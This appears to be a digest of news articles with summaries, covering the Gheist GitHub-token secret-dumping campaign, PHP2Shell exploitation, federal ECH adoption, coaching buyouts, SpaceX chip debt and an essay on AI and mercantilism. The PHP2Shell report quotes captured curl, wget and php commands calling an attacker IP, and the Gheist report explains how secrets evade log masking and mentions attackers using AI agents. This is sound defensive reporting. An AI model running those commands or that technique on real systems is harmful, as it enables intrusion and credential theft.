results.title: Gheist campaign plants secret-dumping workflows using stolen GitHub tokens
results.author: Rami McCarthy, Hila Ramati
results.content:
Gheist: Attempted Scaled Abuse of Stolen GitHub Tokens Stumbles
An automated campaign is planting secret-dumping workflows in every repository that stolen GitHub tokens can reach. It uses no C2 server, is actively evolving, and has been significantly disrupted by recent GitHub security improvements.
Since September 15, 2026, Wiz Research has been tracking Gheist: a new campaign performing mass abuse of compromised GitHub tokens. The attack commits a workflow named sync-check to every repository to which each token has access. The workflow seeks to print the repository's secrets into its own workflow log. Then, the tool downloads the log through the GitHub API and deletes the run seconds later. The tool's API requests carry the user agent gheist, which gives the campaign its name.
We have recovered more than 13,500 planted branches from more than 850 compromised accounts, ranging from personal projects to enterprise organizations' private repositories.
A recent GitHub control has been blocking the exploitation in public repositories, but we've observed successful exploitation and follow-on activity in private repositories and GitHub enterprise environments.
As of October 24:
the attack is ongoing and evolving
roughly ⅔ of implicated accounts are no longer available on GitHub. This likely indicates response activity, as we have reported this activity to GitHub.
How the attack works
For each repository, the tool creates a branch named ci-sync- plus six random characters, then commits .github/workflows/sync-check.yml with the message ci: sync config. The commit is unsigned and authored as the token's owner. The push event triggers the workflow:
GitHub masks secret values in logs only when they appear verbatim. A base32-encoded secret doesn't match, so it prints in full.
While permissions: {} restricts the job's GITHUB_TOKEN, which the attacker doesn't need, it doesn't restrict the secrets context.
When a repository has deployment environments, the tool lists them in a job matrix with environment: ${{ matrix.environment }}, so environment-scoped secrets, often production credentials, are printed too.
Because the secrets leave through GitHub's own API, there is no attacker domain or outbound connection to block.
In enterprise organizations, we saw the tool cycle through tokens of several users and automation accounts within minutes, clone private repositories before planting the workflow, and hours later, cloud credentials from the same organization used to enumerate AWS Secrets Manager.
How the payload evolved
Two variants of this attack have been observed in parallel. They can be distinguished via the branch names.
Tool A uses a hexadecimal suffix and the plain payload.
Tool B uses a base36 suffix, added timeout-minutes: 6 and the environment matrix within hours of its first run on September 28, and modifies the selected payload per repository.
On October 19, Tool B added echo X | base32 -w 120 between the dumps, which prints LAFA==== as a separator, likely for the operator's log parser. Hours later it pushed a second job, sync-host, with runs-on: self-hosted, apparently only to repositories with a registered self-hosted runner. It writes three helper files (.gdmp_pat, .gdmp_patg, .gdmp_sweep) and logs each stage under a ===== gdmp-pivot: <stage> ===== header:
Host details and crontab.
A recursive search of the home directory, workspace and system paths for 31 token formats (including keys for AI providers such as Anthropic, Hugging Face, Groq and NVIDIA), private keys, .env files, Terraform state and shell history.
The environment of every process, from /proc/*/environ.
Through the Docker socket, a container with the host's root filesystem mounted, to repeat the search on the host.
AWS instance-role credentials, plus GCP and Azure metadata.
GitHub Actions and GitLab runner credential files.
The Kubernetes service account token.
However, this job is buggy: it looks for the wrong runner key file, its URL-credential regex is broken, and it doesn't collect GCP or Azure tokens.
GitHub's approval hold and private repositories
Since July 28, 2026, GitHub has held potentially malicious workflow runs in public repositories until a collaborator approves them. Every public Gheist run we checked, across all variants including the self-hosted job, sits at action_required. The control worked, and the malicious payloads never ran.
Unfortunately, that hold doesn't apply to private repositories or GitHub Enterprise Server. There, GitHub audit logs show runs on ci-sync-* branches completing and then being deleted by the gheist user agent. CloudTrail shows the organizations' own workflows running on those branches and assuming AWS roles, which proves Actions executed without approval.
For defenders, that last signal finds Gheist without any GitHub logs, as shown below.
Other activity on the same accounts
This campaign is leveraging compromised GitHub access. The same accounts are used by other actors and campaigns, which demonstrates how compromised credentials can move throughout the threat actor ecosystem. We've observed overlaps with the following campaigns:
Lure repositories (malware distribution). On October 6, 391 accounts renamed about 1,461 repositories to cracked-software lures like fl-studio-crack and solana-sniper-lite. The rename wiped 610 ci-sync branches as a side effect. 166 of these accounts never appear in Gheist activity, so the pool is larger than Gheist's footprint.
Free compute (cryptomining). On October 18, 25 Gheist accounts each created a "Windows RDP Runner" repository within nine minutes, attempting to abuse GitHub Actions for free compute cycles.
PolinRider. Some victims appear to be infected with PolinRider, the DPRK-linked malware that hides JavaScript in build config files and force-pushes back-dated commits. On October 19 and 20, three victims re-pushed their Gheist commits with a loader appended to vite.config.js behind hundreds of whitespace characters, and in two cases an api.js that package.json runs before every dev and build.
Megalodon. 57 accounts from Gheist's first phase were also victims of Megalodon in May.
The credential sources we could trace fit this picture: infostealer logs, and tokens exposed in earlier supply-chain compromises such as the Trivy compromise in March.
Note: Gheist is distinct from GhostAction, which uses different workflow files and exfiltrates secrets to 193.32.204[.]199.
Which actions should security teams take?
Hunt
Look for branches named ci-sync- followed by six random characters, where the only change is a new file at .github/workflows/sync-check.yml with the commit message ci: sync config.
In GitHub audit logs, look for workflow runs on ci-sync-* branches that were deleted within a minute of completing, and for any activity from the user agent gheist.
If your workflows authenticate to the cloud with OIDC, check cloud audit logs for role assumptions or token exchanges whose subject includes a ci-sync- branch. That shows GitHub Actions ran on an attacker branch, even if you don't collect GitHub logs.
On self-hosted runners, look for the files .gdmp_pat, .gdmp_patg and .gdmp_sweep, and the string gdmp-pivot in job logs.
Respond
Rotate every repository, organization and environment secret available to an affected repository. Deleting the run or the branch doesn't undo the exposure.
Revoke the tokens that pushed the commits, and check their owners' devices for infostealers.
If a ci-sync branch ran on a self-hosted runner, treat the host and its instance role as compromised.
Don't approve held sync-check runs, and don't run code from ci-sync branches.
Harden. Require reviewers on environments with production secrets, scope OIDC trust policies to protected branches or environments, use GitHub Apps or short-lived fine-grained tokens instead of personal access tokens, and run self-hosted runners as ephemeral hosts without Docker socket or unrestricted metadata access.
Indicators of compromise
User agent gheist
Branch ci-sync- followed by six characters, matching ^ci-sync-[0-9a-z]{6}$
Commit message ci: sync config adding only .github/workflows/sync-check.yml
The Threat Center advisory includes an Event Explorer query covering planted commits, Gheist activity in GitHub audit logs and cloud role assumptions from attacker branches. Wiz Defend detects the activity with rules including "New Workflow Completed And Deleted In Short Time Span", "Workflow Pushed With Secret Dump" and "Commit Created With Known Malicious Commit Message".
Wiz Research is tracking an ARTEX-using actor, overlapping with Storm-0940, across multiple targeted software vendors. Learn how the AI agent attacks Okta, Entra, and Cognito, and what it left behind in the logs.

results.summary:
The Gheist campaign is actively exploiting compromised GitHub tokens to inject malicious workflows into repositories, aiming to exfiltrate sensitive secrets and credentials from private and enterprise environments.

### Key Points
- Since September 15, 2026, attackers have used the "gheist" user agent to plant automated "sync-check" workflows in over 850 compromised GitHub accounts.
- The malicious workflows bypass standard security by printing secrets to logs, which are then exfiltrated via the GitHub API to avoid external network detection.
- While GitHub’s approval requirements block these attacks in public repositories, private repositories and enterprise environments remain vulnerable to unauthorized workflow execution.
- Advanced variants of the tool attempt to compromise self-hosted runners by searching for private keys, cloud credentials, and tokens for AI providers like Anthropic and NVIDIA.
- The campaign overlaps with other malicious activities, including cryptomining, malware distribution, and the use of infostealers to harvest initial access credentials.

### Why it Matters
This campaign highlights a significant security risk for organizations relying on GitHub Actions, as attackers can leverage stolen tokens to pivot from code repositories into cloud infrastructure. Because the attack uses legitimate API channels to exfiltrate data, security teams must prioritize rotating secrets and hardening OIDC trust policies to prevent unauthorized role assumptions.

results.title: FBI tip line and veterans crisis site among 350 federal web addresses exposing visitors to network spies, senator warns
results.author: Rahimnoorali11@gmail.com (Rahim Amir) , Rahim Amir
results.content:
- Sen. Ron Wyden wants CISA and OMB to require Encrypted Client Hello on federal websites and make it a federal contract condition
- His list of 350 CDN-hosted addresses without ECH includes the FBI tip portal, the VA's crisis line, and hotlines for whistleblowers and civil rights complaints
- ECH hides site names only alongside encrypted DNS, does nothing for server breaches, and is already blocked in Russia, where some listed embassy pages are aimed
US Senator Ron Wyden (D-Ore.) wants the federal government to turn on a privacy feature that major web browsers have supported for three years, warning that hundreds of agency web addresses still broadcast the name of the site each visitor uses to anyone watching the network along the way.
In a letter to CISA acting director Nick Andersen and deputy federal chief information officer Thomas Flagg, Wyden asked the two agencies to require Encrypted Client Hello (ECH) across federal websites and to make ECH support a condition for cloud and network vendors seeking federal contracts.
The letter attaches a list of 350 executive branch web addresses that use content delivery networks (CDNs) but do not use ECH, while requesting an unclassified response and action plan by November 20 2026.
The one thing HTTPS leaves in the open is the gap being addressed here
Almost every federal site now encrypts the pages people read and the forms they submit. Standard HTTPS does not hide the hostname. When a browser opens a secure connection, it announces the site it wants in a field called Server Name Indication, in plain text, before encryption begins.
An internet provider, a hostile Wi-Fi network, or a compromised telecom carrier can therefore log that a connection went to tips.fbi.gov without reading a word of the tip itself.
ECH encrypts that part of the handshake. It works best behind a large CDN, where thousands of unrelated sites share the same front door. Cloudflare's implementation, for example, presents every ECH-protected site to the network under one shared name, so an observer can tell a visitor is reaching a Cloudflare-hosted site, but not which one.
Wyden's letter singles out two services. The Department of Veterans Affairs' online suicide prevention service at veteranscrisisline.net is hosted on Amazon Web Services, which the letter says does not currently support ECH. The FBI's tip portal at tips.fbi.gov runs on Cloudflare, which does, but the bureau has not turned it on yet, as Wyden noted, stating: "For the federal domains using a CDN provider with ECH support, such as Cloudflare, turning on domain protection merely requires a configuration update."

191 of the 350 addresses, or 54.6%, are diplomatic: 174 embassy sites, three consulates, and 14 missions, mostly to international bodies such as NATO and the UN. Another 53 are subdomains of bie.edu, the Bureau of Indian Education's domain, which appear to be individual school sites. A further 12 are test, training, or staging hosts, including several user acceptance testing subdomains for Education Department debt services.
That leaves 94 addresses outside those groups, and the most troubling entries sit there; they include the DHS inspector general's complaint hotline, the Justice Department's civil rights reporting portal, the intelligence community's job application site, a USCIS tip form, the State Department's Rewards for Justice site, an NIH alcohol treatment navigator, a CDC doxy-PEP site, several federal HIV information sites, and ICE's detainee locator.
Cloudflare's documentation says ECH is enabled by default on Free zones, while customers on other plans must switch it on themselves. That fits the spokesperson's finding: a paying government customer has to opt in. For the FBI, the fix really is a setting.
For the VA, it is not. If Amazon's CDN does not offer ECH, the agency would need to change providers or wait. This is where Wyden's second request, making ECH support a condition of federal contracts, gets complicated.
A procurement rule written today would, in practice, favor a very small pool of providers until others catch up. That may be the intent, since it pressures Amazon and its rivals, but it may be as much a market lever as a security fix, at least in the short term.
ECH does have its limitations, however: the protocol's own specification warns that the destination can still leak through plaintext DNS lookups or the server's IP address. Google made the same point when Android 17 added system-wide ECH in August, saying the feature works "in tandem with private DNS to obscure the domain names you visit."
To reiterate, agencies can enable ECH on their side, but they cannot make a veteran on home broadband use encrypted DNS, therefore leaving the door open to exploitation by someone snooping on the network.
A bigger problem is also international coverage. Many of the highlighted URLs are embassies such as ru.usembassy.gov, by.usembassy.gov, cn.usembassy.gov, and ir.usembassy.gov, all of which arguably have users connecting from relatively hostile networks.
Russia has been blocking Cloudflare's ECH since November 2024, with regulator Roskomnadzor declaring at the time that using it violates Russian law. Russian providers block connections that carry both an ECH extension and Cloudflare's shared outer name, which left Cloudflare customers there choosing between disabling ECH and moving to a domestic CDN.
For an embassy page, enabling ECH could mean trading a visible hostname for an unreachable site in the country where the hostname matters most, making it a difficult tradeoff with only one real solution: skipping ECH for now.
None of this is new territory for Wyden. In October 2018, he wrote to DHS's Chris Krebs urging agencies to adopt encrypted DNS and Encrypted SNI, ECH's predecessor, and asking DHS to work with GSA on making ESNI a condition for CDN vendors selling to the government.
He called that "the next logical step" after DHS's 2017 HTTPS directive, BOD 18-01. The 2026 letter cites the same directive and describes its requests as "the next logical steps." His record on these letters is mixed rather than hopeless. A 2018 HTTPS letter to the Pentagon was followed by a Defense Department plan to secure its websites.
The client side is ready: most major browsers have supported ECH since October 2023, per the letter, and Android 17 now applies it system-wide. The FBI fix is cheap and overdue. But ECH narrows what a passive eavesdropper learns rather than making a visit invisible, and whether this request outlasts the last one may depend less on CISA and OMB than on whether Amazon and others join Cloudflare.

results.summary:
Senator Ron Wyden is urging federal agencies to adopt Encrypted Client Hello (ECH) to protect user privacy by masking the specific websites visited by citizens on federal domains.

### Key Points
- Senator Wyden identified 350 federal web addresses, including FBI and VA portals, that currently fail to use ECH to hide site names from network observers.
- ECH encrypts the Server Name Indication (SNI) field, preventing third parties from logging which specific subpages a user accesses during an encrypted HTTPS session.
- The senator requested that CISA and the OMB mandate ECH implementation and require it as a condition for future federal cloud and network service contracts.
- Agencies have until November 20, 2026, to provide an unclassified response and a formal action plan regarding these privacy upgrades.
- While some providers like Cloudflare support ECH, others like Amazon Web Services currently do not, complicating the proposed federal procurement requirements.

### Why it Matters
Implementing ECH would prevent internet service providers and malicious actors from tracking sensitive user activity, such as visits to whistleblower hotlines or crisis counseling services. This initiative forces a broader conversation about whether the federal government should use its massive purchasing power to compel private cloud vendors to adopt modern privacy standards.

results.title: The buyout economics of the 2026-27 coaching carousel: Baylor, NC State face stiff payouts
results.author: John Talty
results.content:
Baylor became the third Power Four program to fire its head coach on Sunday when it dismissed Dave Aranda after seven seasons.
Baylor joined North Carolina State and Maryland as the coaching carousel finally got spinning in late October.
With each firing comes a high financial cost to move on from the coach. What is each school paying to fire its coach, and where could it go next? CBS Sports breaks it down below.
Baylor
Fired coach: Dave Aranda (40-40 in 7 seasons)
Cost: Reportedly $12 million
Baylor fired Dave Aranda on Sunday following disappointing losses to TCU and Kansas. Aranda had seemingly cooled his seat with a 4-1 start, but those losses ultimately doomed him. As a private school, Baylor does not release coaching contracts the way public schools must. The buyout figure was believed to be approximately $12 million last season, while Yahoo Sports' Ross Dellenger reported that same figure for this year's cost.
Candidates to replace Aranda include Boise State's Spencer Danielson and UTSA's Jeff Traylor. Check out the
Maryland
Fired coach: Mike Locksley (39-54 in 8 seasons)
Cost: $9.75 million
Maryland kicked off the coaching carousel when it fired Mike Locksley on Wednesday. The school owes Locksley around $9.75 million with no offsets if he takes another job. Half of that $9.75 million is due to Locksley within sixty days. He had been under contract through 2028 but was let go after a 2-5 start to the season, which included losses to Rutgers, Virginia Tech and UCLA.
Candidates to replace Locksley include Wake Forest's Jake Dickert, New Mexico's Jason Eck and Memphis' Charles Huff. Full .
North Carolina State
Fired coach: Dave Doeren (98-73 in 14 seasons)
Cost: $10.3 million
NC State opted for a rare Saturday afternoon firing when it dumped Dave Doeren after 14 seasons. There had been rumblings before the season that this could be Doeren's last in Raleigh, but that was centered around a possible retirement and not a firing. Instead, NC State will pay approximately $10.3 million to buy out the remainder of a contract set to run through 2029. NC State owes Doeren a little more than $600,000 within the next 30 days, and can then pay the remainder in monthly installments. The 54-year-old Doeren does have a clause in his contract requiring him to make reasonable efforts to find another job, which could offset the buyout NC State owes.
The early candidate to watch to replace Doeren is former NC State quarterback great Philip Rivers. More on
results.summary:
Baylor, Maryland, and North Carolina State have dismissed their head football coaches, signaling an active coaching carousel across the Power Four conferences as schools navigate significant financial buyouts.

### Key Points
- Baylor fired Dave Aranda after seven seasons, incurring a reported $12 million buyout following recent losses to TCU and Kansas.
- Maryland dismissed Mike Locksley after a 2-5 start, triggering a $9.75 million payout with no offsets for future employment.
- North Carolina State terminated Dave Doeren’s contract, resulting in a $10.3 million buyout obligation for the remainder of his deal through 2029.
- Potential replacements for the vacancies include Boise State’s Spencer Danielson, UTSA’s Jeff Traylor, and former NC State quarterback Philip Rivers.

### Why it Matters
These coaching changes highlight the immense financial pressure and high expectations currently facing major college football programs. The combined buyout costs exceeding $32 million underscore the significant capital universities are willing to spend to restructure their athletic leadership.

results.title: PHP2Shell Exploitation Hits Government Entity Amid Global Scanning and Signs of AI-Assisted Hacking
results.author: info@thehackernews.com (The Hacker News)
results.content:
In an update, Palo Alto Networks Unit 42 said it's retracting its earlier assessment that the post-compromise activity targeting the European government agency involved the exploitation of the PHP2Shell flaws.
"What researchers saw was an attack against a European government agency executed in the context of a vulnerable PHP application," a spokesperson for the company told The Hacker News via email. "This led us to believe that it was exploitation of those vulnerabilities. We are unable to confirm that initial access is associated with the specific PHP2Shell CVEs."
The original story follows.
Threat actors have been observed using agentic artificial intelligence (AI) platforms for post-exploitation activity following the abuse of the PHP2Shell vulnerabilities tracked as CVE-2026-109618 and CVE-2026-109619.
"In one case, the attackers targeted a government entity in Europe and within two hours of the initial exploitation they had successfully accessed password hashes and multi-factor authentication secrets," Palo Alto Networks Unit 42 said.
"They also established an NT LAN Manager (NTLM)-relay tunnel into Active Directory and attempted Domain Admin privilege escalation."
The network security company said it also observed the unknown attacker enumerating the compromised endpoint, with commands and behavioral markers suggesting the work of an agentic attacker. These include commands to facilitate -
- Reconnaissance of the authentication database with stolen credentials, targeting password hashes and two-factor authentication (2FA) secrets.
- Active Directory (AD) reconnaissance via curl-based anonymous LDAP queries to the domain controller (DC) in an attempt to look for the administrator account.
- Reconnaissance of the host to hunt for DNS/AD integration, internal hosts, privileged groups, and interactive users.
"Each command batch is wrapped in section-header delimiters, such as ==SHELLUSER== and ==PASSWD==," it added. "These delimiters produce machine-parseable output for an AI model to read."
Suspected N. Korea Campaign Targets PHP2Shell
The disclosure comes as CYFIRMA said it uncovered a suspected North Korea-linked campaign employing PHP2Shell to actively probe global PHP infrastructure from 21 compromised nodes.
"The scanning is deliberately low-volume and paced," Kumar Ritesh, CEO and founder of CYFIRMA, told The Hacker News. "Nodes are rotated and abandoned at the first sign of blocking or rate-limiting, so threshold-based alerting is unlikely to catch it."
The targets comprise a set of 216 unpatched or partially mitigated hosts located across the U.S., Japan, South Korea, Thailand, Indonesia, Australia, Taiwan, India, Singapore, the U.A.E., Saudi Arabia, and the E.U. The hosts span government, financial institutions, logistics, airports and aviation, manufacturing, and online transaction platforms.
"The campaign has moved from reconnaissance into active, low-and-slow scanning of a filtered target set," CYFIRMA said. "Organizations in the prioritised sectors and geographies should assume they are in scope for deliberate targeting."
The activity, coordinated via a closed I2P channel, has been attributed with moderate confidence to a Korean-speaking operator assessed to be affiliated with the Lazarus Group ecosystem. According to CYFIRMA, the two handles (전창혁 2 aka Jeon Chang-hyuk 2) and (최아린 aka Choi A-rin) active in the I2P channel have previously been observed running covert operations for the threat actors.
"Korean-speaking operators have used [the channel] to share target lists, exploit-hosting infrastructure, and tasking and prioritisation consistent with DPRK objectives," Ritesh said. "The captured conversation uses vocabulary and spelling specific to North Korean (Munhwaŏ) rather than the South Korean standard."
Other primary indicators that link the campaign to the Lazarus cluster are below -
- Command-and-control (C2) infrastructure that Lazarus has previously used to exploit web assets.
- Lazarus Group's documented history of compromising PHP and WordPress servers for C2 and planting of PHP and ASP web shells, as observed in the SyncHole watering hole campaign.
- Prioritizing government agencies and banks, specifically online transaction platforms, which is in line with Lazarus Group's track record of breaching financial institutions for financial and cryptocurrency theft.
"Exploitation is the next step," CYFIRMA said. "The operators said they would shortlist the most promising targets the same day and then choose which public exploits to adapt."
Other Exploit Efforts and Mitigations
In an October 25, 2026, post shared on X, Defused Cyber said it's also seeing PHP2Shell probes targeting its Palo Alto Networks GlobalProtect honeypots. The activity originates from 204.76.203[.]7, a known mass-exploit IP address.
"The requests carry a PHP_SESSION_UPLOAD_PROGRESS marker ('p2s-rider') and a dummy file upload with no payload, which points to someone checking for the vulnerable upload-progress behavior and likely building a target list of Palo Alto devices," the threat intelligence company said.
Both CVE-2026-109618 and CVE-2026-109619 are critical vulnerabilities that can lead to remote code execution in default PHP configurations. The security flaws have witnessed widespread scanning efforts, with Cloudflare stating it detected millions of exploitation attempts after public disclosure.
"An attacker faces two main constraints: they must size a request to fail allocation at the right moment, and they must defeat ASLR to find valid memory addresses," Datadog said. "The exploit needs one field name small enough to fit inside the accepted request body but large enough that copying its key exceeds memory_limit."
"When PHP parses a form-field name, it makes several copies along the way. The attacker uses that extra memory to force an allocation failure while PHP copies the name into a hash table."
ReliaQuest, in an update published on October 22, 2026, said it reproduced CVE-2026-109618 in a controlled lab and observed a sequence of errors that could help defenders identify exploitation.
"This testing identified a specific sequence of artifacts across PHP error, Apache access, Apache error, and system logs that may help defenders detect exploitation," it said. "Defenders should focus on the sequence: a POST request returns a 500 error, PHP reports memory exhaustion and heap corruption, and the Apache worker handling the request crashes."
The PHP Foundation has since warned of a third remote code execution vulnerability (CVE-2026-115560), which can only "occur under an unusual combination of configuration and application code." The issue is expected to be addressed as part of the regular release cycle.
"An application must set session.serialize_handler to php_binary or php_serialize in its configuration and then switch it to php at runtime with ini_set() before calling session_start()," the Foundation said. "Session upload progress must also still be enabled. Applications that never change the serialize handler at runtime can keep the feature enabled."
Xint has released a scanner to check if a host is exposed to PHP2Shell, stating remote code execution is possible in any PHP script regardless of the application and in applications where decoding occurs, such as with session_start() and unserialize().
Bitsight's internet-wide scans show that there are nearly 37 million internet-facing systems running PHP or PHP-related software, with most of the exposures in the U.S., Germany, France, the Netherlands, and Japan.
"PHP runs a very large portion of the web, from content management systems and online shops to bespoke internal tools," Bitsight said. "A flaw in the runtime can't be repaired by changing application code, and a web application firewall or plugin update won’t remove it. Only updating PHP on the host itself closes the gap."
First ITW Successful Exploitation Attempt Recorded
Perplexity researcher Adel Karimi has recorded what appears to be the first in-the-wild (ITW) successful exploitation of the PHP2Shell vulnerabilities to run shell commands on honeypot servers. These commands have been observed using wget, curl, or PHP CLI to fetch additional payloads from a remote server ("162.35.99[.]94:80").No downloaded second-stage artifacts have been observed so far.
Some of the captured shell commands are listed below -
- php -r 'file_get_contents("http://162.35.99.94:8080/pwn-[T2-honeypot-IP]");'
- curl -s http://162.35.99.94:8080/pwn-[T2-honeypot-IP] >/dev/null
- wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]
- curl -s http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)
- wget -q -O- http://162.35.99.94:80/pwn-[T2-honeypot-IP]-$(id -un)
- php -r 'file_get_contents("http://162.35.99.94:80/pwn-[T2-honeypot-IP]");'
"This is by far the highest quality confirmation of in-the-wild PHP2Shell exploitation I've seen so far," Expel security researcher Marcus Hutchins said in an X post.
results.summary:
Palo Alto Networks Unit 42 has retracted its claim linking a European government agency breach to PHP2Shell vulnerabilities, even as global exploitation of the flaws continues.

### Key Points
- Palo Alto Networks Unit 42 clarified that while a government agency was compromised via a vulnerable PHP application, they cannot confirm PHP2Shell (CVE-2026-109618/109619) involvement.
- CYFIRMA identified a suspected North Korea-linked campaign using PHP2Shell to probe 216 hosts across global financial, government, and aviation sectors.
- Researchers observed attackers using agentic AI to automate post-exploitation tasks, including Active Directory reconnaissance and credential harvesting.
- Security firms, including ReliaQuest and Datadog, have provided detection methods for PHP2Shell, which can cause memory exhaustion and Apache worker crashes.
- Bitsight reports that approximately 37 million internet-facing systems remain potentially exposed, necessitating direct PHP updates to mitigate the remote code execution risks.

### Why it Matters
The widespread nature of these vulnerabilities poses a significant threat to global infrastructure, as PHP powers a vast portion of the modern web. The emergence of agentic AI in these attacks highlights a shift toward more sophisticated, automated exploitation that can rapidly escalate from initial access to domain-wide compromise.

results.author: Omkar Godbole, AI Boost
results.content:
Elon Musk issues a warning for 'AI neoclouds' as SpaceX borrows $40 billion for chips
SpaceX has raised $40 billion in debt to buy GPUs, while Musk predicts a major shakeout among smaller AI cloud providers.
- SpaceX has raised $40 billion in callable debt to buy GPUs, leveraging its strong credit rating and revenue from Starlink and rocket launches.
- Elon Musk said debt markets have largely closed to companies without substantial revenue beyond AI data centers, and he predicted that more than 200 “neocloud” providers will consolidate into a few survivors.
Nasdaq-listed SpaceX · has raised $40 billion in debt to buy GPUs, the powerful processors used to run artificial-intelligence systems. 
Elon Musk announced the deal on X, pairing it with a warning for neoclouds — companies whose revenue depends almost entirely on data centers — that could add to AI jitters on Wall Street and risk aversion in broader financial markets, including cryptocurrencies.
The $40 billion deal is mainly callable debt, meaning SpaceX can repay it early. The money could be used to pay for GPU deliveries expected in the first half of 2027, though Musk did not explicitly say so. Reuters previously reported that SpaceX was negotiating with banks and asset managers to raise $40 billion to buy Nvidia AI chips.
Musk said the reason SpaceX could borrow the money is because it has a strong credit rating and steady revenue from Starlink internet service and rocket launches. Those businesses do not depend on AI data centers, making it easier for SpaceX to secure chip financing than for companies that rely entirely on data centers for revenue. Debt funding for such firms is drying up, Musk noted.
“As of the past few weeks, debt markets have almost entirely shut off access to money for any company that doesn’t have substantial revenue independent of AI data centers,” he said on X.
Musk predicted that more than 200 “neoclouds” — newer companies that rent out AI computing power — will consolidate, with only a few surviving.
The episode shows how costly the AI computing race has become. Building large clusters of AI chips can require tens of billions of dollars. Companies with diverse revenue and strong credit can still borrow; firms whose entire business depends on AI infrastructure face a tougher time as lenders become more selective.
Venture capitalist Chamath Palihapitiya had earlier said many neoclouds appear poorly funded and badly run. He argued that Amazon, Microsoft and Google are moving slowly on deals and prefer to keep computing power for their own use. He said delays in building data centers could leave many chips and half-finished projects sitting idle or failing to earn enough to cover financing costs in 2027.
Lately, financial markets have become increasingly worried about the payoff from massive AI spending. That has pressured AI-linked stocks and the broader market. Nasdaq futures traded near 29,080 as of this writing, down sharply from above 30,000 early this month.

results.title: Cognitive Mercantilism: AI panic resembles fears of early capitalism
results.author: Venkatesh Rao
results.content:
I’ve been reading Joyce Appleby’s The Relentless Revolution: A History of Capitalism (2010), and it has me circling a rather delicious thought: AI panic is really a form of cognitive mercantilism. If we regard market capitalism as the first planetary intelligence, as many (including me) do, the parallels are closer than you might think.
Appleby’s book is a sweeping history of capitalism, from its unlikely emergence in early modern England to its eventual transformation of the entire world. Her central argument is that capitalism was not the inevitable expression of some timeless human instinct to trade and accumulate wealth. It was a historically contingent cultural invention, enabled by agricultural improvements, expanding trade, and changing ideas about work, wealth, and human nature. In particular, it required escaping the assumptions of an older, essentially zero-sum worldview, in which wealth meant controlling land, bullion, and the labor of largely impoverished populations.
Capitalism emerged when people began discovering that wealth could be created rather than merely captured, and that ordinary people could be sources of demand and initiative rather than merely labor to be commanded as a factor of production.
The parallels with our current moment are striking.
As Appleby tells it, the mercantilist worldview that preceded capitalism rested on roughly four interlocking beliefs.
First, wealth was fundamentally scarce and finite. It consisted primarily of land, the agricultural produce of that land, and the precious metals it contained, accumulated through mining, trade and conquest. The goal of economic statecraft was to control more territory, maintain a favorable balance of trade, and accumulate bullion. One nation’s gain was presumed to be another’s loss. The resulting politics was one of treasure-seeking and beggar-thy-neighbor competition.
Second, ordinary people could not be trusted with much freedom. The poor were assumed to be unruly, ignorant, and prone to disorder if left to their own devices. They needed to be governed coercively by elites, supposedly for their own good and for the stability of society.
Third, economic thinking was overwhelmingly oriented toward supply and its control. Wealth came from controlling productive resources and commanding high prices for their output. Aggregate demand, especially demand from the poor, was barely recognized as a significant economic force. Ordinary people were primarily factors of production. They ate, worked, and reproduced, with no share of any surplus. The only real discretionary consumers were elites, who bought luxuries and commanded all surplus.
Fourth, there was little reason to imagine most people doing anything other than agricultural labor. If something like 80% of the population was engaged in inefficient subsistence farming, that was simply the natural order of things. What else were they good for? Remove them from the fields and you would merely have millions of useless mouths to feed.
Now replace wealth with intelligence, and mercantilism with cognitive mercantilism.
The parallels are almost embarrassingly direct.
First, intelligence is imagined as a fixed resource embodied in human brains and the knowledge products mined from them. The objective of national and corporate strategy becomes attracting the best brains, controlling their output, accumulating intellectual property, and maintaining a favorable balance of knowledge trade. The cognitive mercantilist wants to hoard intelligence and its products like bullion. The global competition for talent becomes a treasure hunt for genius brains and the valuable knowledge species they can produce, which now includes AIs in addition to copyrightable culture and patentable inventions.
Second, supposedly stupid people cannot be trusted to think for themselves. They need to be governed by cognitive elites, who know better and must regulate the behavior of the less intelligent for their own good. Democratizing intelligence is dangerous because the masses will misuse it, fall for nonsense, or unleash chaos. The assumption is that intelligence is safe only in the hands of those already certified to possess it.
Third, the supply of intelligence is treated as the central economic fact. Controlling its production, preserving its scarcity, and maintaining high prices for brains and knowledge products (including AIs) are the primary concerns. The demand side barely registers. Less intelligent people are regarded as limited cognitive laborers and passive consumers of whatever knowledge products elites choose to provide. They are not imagined as significant sources of demand for intelligence in their own right, let alone as participants in its further production.
Fourth, the cognitive mercantilist assumes that most people are not good for much intellectually. If 80% of humanity is occupied in low-grade cognitive labor, or simply muddling along without producing much intelligence at all, that is unfortunate but natural. Automating their cognitive work merely threatens to create billions of useless minds to occupy.
This last assumption is where the analogy gets especially interesting.
The agricultural revolution that helped launch capitalism began overturning the apparent necessity of having most of humanity engaged in farming. Over the following centuries, improvements in agricultural productivity reduced the fraction of the population required to produce food from a large majority to a tiny minority in advanced economies.
The result was not a world full of useless mouths. It was a world in which vastly more people could do things other than farm, while enjoying access to vastly more food.
I don’t know how to farm. I can barely keep a houseplant alive. Yet I can obtain an astonishing variety of foods, in quantities that would have seemed fantastical to an early modern peasant. My inability to produce food is economically almost irrelevant. What matters is that I can consume it, enjoy it, develop tastes for it, and devote my energies to other things.
The analogous possibility with AI is that most people will no longer need to be significant producers of intelligence in order to become significant consumers of it.
And this is where cognitive mercantilism begins to look as quaint as its seventeenth-century predecessor.
The Revolution in Desire
One of the more fascinating elements of Appleby’s account is her emphasis on the emergence of new kinds of demand in Britain, well before the familiar story of steam engines, factories, and industrial capitalism really gets going.
As international trade expanded, ordinary Britons began developing tastes for goods that had previously been luxuries reserved for the wealthy. Tobacco, tea, sugar, and colorful Indian cottons were among the commodities that helped create a new consumer culture. People began wanting things that were neither necessities of subsistence nor traditional markers of aristocratic status. And they were willing to voluntarily work harder to get them.
Appleby describes a striking increase in the number of days worked annually, from something like 250 to 300 (sometimes called the industrious revolution), before the Industrial Revolution. This was not simply a matter of landlords or factory owners coercing more labor out of unwilling workers. A significant part of the increase was voluntary, driven by the prospect of acquiring desirable goods. People worked more days, adopted more productive agricultural practices, entered new trades, and sought opportunities for earning larger cash incomes.
The increase in productivity generated surplus incomes, which sustained the expanding demand for consumer goods, which in turn incentivized further increases in productivity. A virtuous cycle was taking shape.
This happened roughly a century before organized labor movements and socialism emerged as major political forces.
By the late 20th century, this was the global default. Aggregate global demand was the “fortune at the bottom of the pyramid” as C. K. Prahlad put it.
